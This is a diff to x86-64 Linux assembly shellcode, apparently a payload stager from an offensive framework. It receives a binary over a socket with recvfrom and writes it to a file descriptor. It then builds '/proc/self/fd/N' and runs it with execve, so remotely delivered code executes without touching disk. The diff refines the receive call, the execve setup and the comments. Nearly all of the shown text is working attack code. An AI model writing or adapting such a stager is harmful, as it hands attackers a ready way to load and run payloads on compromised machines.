@@ -1,6 +1,6 @@
 ; Authors:
 ; Ivan Nikolsky (https://github.com/enty8080)
-; Tomas Globis (https://github.com/)
+; Tomas Globis (https://github.com/TomasGlgg)
 
 section .text
 global _start
@@ -55,27 +55,28 @@ _start:
 	mov R10, 0x22
 	syscall
 
-    ; r15 = address
-    mov R15, RAX
+	; r15 = address
+	mov R15, RAX
 
-    ; read(sockfd, "", size)
-	xor RAX, RAX
+	; int recvfrom(fd, buf, size, WAITALL, nullptr, 0);
+	mov RAX, 45
 	mov RDI, R13
 	mov RSI, R15
 	mov RDX, R12
+	mov R10, 0x100
 	syscall
 
-    ; write(fd, "", size)
-    mov RAX, 1
-    mov RDI, R14
-    mov RDX, R12
-    syscall
+	; write(fd, "", size)
+	mov RAX, 1
+	mov RDI, R14
+	mov RDX, R12
+	syscall
 
 
-    ; === CONCAT INT TO STR (https://gist.github.com/TomasGlgg/c7c70acdd391fde30c221201b2cf7df8)
+	; === CONCAT INT TO STR (https://gist.github.com/TomasGlgg/c7c70acdd391fde30c221201b2cf7df8)
 
-    add RSP, 16
-	mov qword [RSP], 0x6f72702f
+	add RSP, 16
+	mov qword [RSP], 0x6f72702f  ; /proc/self/fd/
 	mov qword [RSP+4], 0x65732f63
 	mov qword [RSP+8], 0x662f666c
 	mov qword [RSP+12], 0x002f64
@@ -107,13 +108,14 @@ convert_loop:
 	test RAX, RAX
 	jnz convert_loop
 
+	; === CONCAT DONE ===
 
-    ; execve(fd, [], [])
-    lea RDI, [RSP]
-    mov RAX, 0x3b
-    cdq
-    push rdx
-    push rdi
-    mov rsi, rsp
-    syscall
 
+	; execve(fd, [], [])
+	mov RAX, 0x3b
+	lea RDI, [RSP]
+	xor RDX, RDX
+	push rdx
+	push rdi
+	mov rsi, rsp
+	syscall
